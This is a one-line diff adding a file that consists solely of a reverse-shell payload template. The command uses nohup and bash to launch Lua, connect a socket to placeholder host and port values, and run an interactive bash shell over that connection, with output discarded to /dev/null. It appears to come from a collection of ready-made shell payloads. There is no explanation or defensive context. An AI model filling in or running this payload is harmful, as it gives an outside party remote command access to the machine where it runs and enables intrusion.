@@ -1,0 +1,1 @@
+/usr/bin/nohup /bin/bash -c 'lua -e "require('\''socket'\'').connect('\''__HOST__'\'','\''__PORT__'\'');require('\''os'\'').execute('\''/bin/bash -i <&3 >&3'\'');" &' >/dev/null
